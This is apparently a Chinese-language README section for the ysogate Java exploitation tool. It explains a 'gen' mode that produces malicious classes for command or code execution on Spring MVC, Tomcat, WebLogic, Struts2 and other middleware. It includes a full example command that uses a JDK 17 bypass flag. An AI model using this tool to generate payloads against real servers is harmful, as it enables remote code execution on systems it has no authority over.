## Gen Mode

可以使用`-m gen`来使用gen模式，用于生成恶意类

```
[root]#~  Gen Mode Options:
 -bypass                   ByPass JDK Module
 -f,--format <arg>         Output format
 -h,--help                 Show help message
 -m,--mode <arg>           Operation mode: 'payload' or 'jndi' or 'gen'
 -name,--classname <arg>   Evil Class Name
 -s,--sink <arg>           Evil sink template
 -t,--type <arg>           Middleware type
```

示例，生成springmvc的命令执行回显，添加-bypass绕过jdk高版本限制，适用于jdk17

```
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -bypass
```

以下是支持的中间件/框架以及执行模式

| 中间件/框架 | 执行模式          |
| ----------- | ----------------- |
| springmvc   | CmdExec，CodeExec |
| tomcat      | CmdExec，CodeExec |
| resin       | CmdExec，CodeExec |
| weblogic    | CmdExec，CodeExec |
| jetty       | CmdExec，CodeExec |
| websphere   | CmdExec，CodeExec |
| undertow    | CmdExec，CodeExec |
| glassfish   | CmdExec，CodeExec |
| struts2     | CmdExec，CodeExec |
